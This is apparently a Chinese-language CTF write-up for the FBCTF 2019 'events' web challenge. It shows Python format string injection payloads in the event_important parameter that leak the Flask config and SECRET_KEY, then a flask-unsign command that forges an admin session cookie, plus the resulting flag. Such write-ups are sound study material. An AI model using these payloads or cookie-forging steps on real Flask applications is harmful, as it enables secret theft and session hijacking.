# events

這題其實一開始我們方向全錯

一直往cookie去踹

但後來我從`asd:asd`這個帳號發現有人成功利用 python format string 漏洞撈到東西

一開始還以為是有人故意放假的 Response 混淆大家

結果發現重新整理，address 也會跟著變，才知道是真的，差點笑死

![](https://github.com/w181496/CTF/blob/master/fbctf2019/events/asd.png)

所以後來我才開始踹 format string

然後發現漏洞在: `event_name=a&event_address=a&event_important=__dict__`

=> `{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7fb2c5ba2588>, 'fmt': '{0.__dict__}', 'show': '__dict__', 'name': 'a', 'owner_id': 67, 'address': 'a', 'id': 5335}`

`event_important` 參數可以 injection

而 config 在: `event_name=a&event_address=a&event_important=__class__.__init__.__globals__[app].config`

=>

```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'events_sesh_cookie', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///my.db', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
```

其中 `SECRET_KEY`: `fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y`

用這把 key 去簽 cookie 就行了

簽 key 可以用 flask-unsign 這個 package 去簽 (thanks my teammate @bookgin)

但有點難裝，我是直接用 google colab 去跑XD

![](https://github.com/w181496/CTF/blob/master/fbctf2019/events/colab.png)

`!flask-unsign --secret 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' --sign --cookie "admin"`

=> `ImFkbWluIg.XPSrLA.NdkV5Vsk-a5gDFlll1JcU2SumDI`

把這個塞進 `user` cookie 裡就能拿到 flag


![](https://github.com/w181496/CTF/blob/master/fbctf2019/events/admin.png)


`fb{e@t_aLL_th0s3_c0oKie5}`
